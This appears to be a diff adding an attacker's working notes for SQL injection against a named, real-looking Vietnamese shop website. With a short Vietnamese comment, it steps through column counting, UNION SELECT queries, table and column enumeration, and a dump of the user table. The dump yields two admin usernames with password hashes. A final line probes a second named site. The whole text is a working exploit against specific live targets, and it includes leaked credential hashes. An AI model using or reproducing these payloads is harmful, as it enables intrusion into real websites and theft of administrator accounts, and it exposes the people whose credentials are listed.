@@ -1,0 +1,22 @@
+https://tranhoang.vn/?php=product_detail&id=0 order by (thử tăng số tới khi nào nó khác thường => số trước đó là số cột)
+
+https://tranhoang.vn/?php=product_detail&id=0 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
+
+
+https://tranhoang.vn/?php=product_detail&id=0 union select 1,2,unhex(hex(group_concat(table_name))),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 from information_schema.tables where table_schema=database()--
+
+tbl_product_category,tbl_user,tbl_product,tbl_config,tbl_product_new,tbl_product_special,tbl_visitor,tbl_content,tbl_content_category
+
+https://tranhoang.vn/?php=product_detail&id=0 union select 1,2,unhex(hex(group_concat(column_name))),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 from information_schema.columns where table_schema=database() and table_name='tbl_user'--
+
+id,uid,pwd,cat_id
+
+https://tranhoang.vn/?php=product_detail&id=0 union select 1,2,unhex(hex(group_concat(uid,0x3a,pwd))),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 from tbl_user--
+
+admincp:1a035842a74c6819db5dc30e6b136464,subadmin:31b5d7b1a473763500b9b0d66e1a63c2
+
+
+
+
+https://www.vinamilk.com.vn/products/sudd-optimum-a2-pro?pack=110ml&size=Th%C3%B9ng+24+h%E1%BB%99p orderby 10
+
